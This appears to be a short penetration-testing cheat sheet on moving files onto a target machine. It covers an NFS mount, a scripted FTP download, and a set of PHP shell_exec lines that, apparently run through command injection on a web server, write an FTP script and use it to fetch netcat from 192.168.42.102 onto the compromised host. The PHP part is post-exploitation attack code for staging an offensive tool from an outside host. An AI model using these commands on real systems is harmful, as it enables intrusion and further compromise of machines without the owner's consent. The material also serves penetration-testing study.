File Transfer
=============

### NFS

# You can remotely mount NFS volumes
mount -t nfs xx.xx.xx.xx:/ /tmp/a

### Linux FTP
#!/bin/sh

ftp -n IP <<END_SCRIPT
quote USER user
quote PASS password
binary
GET file.py
quit
END_SCRIPT
exit 0


# Can also be done over php:
<?php echo shell_exec("echo open 192.168.42.102 21>/usr/local/databases/ftp.txt");?>
<?php echo shell_exec("echo user user password>> /usr/local/databases/ftp.txt");?>
<?php echo shell_exec("echo binary>> /usr/local/databases/ftp.txt");?>
<?php echo shell_exec("echo get netcat /usr/local/databases/netcat>>/usr/local/databases/ftp.txt");?>
<?php echo shell_exec("echo bye>> /usr/local/databases/ftp.txt");?>

<?php echo shell_exec("ftp -n < /usr/local/databases/ftp.txt");?>



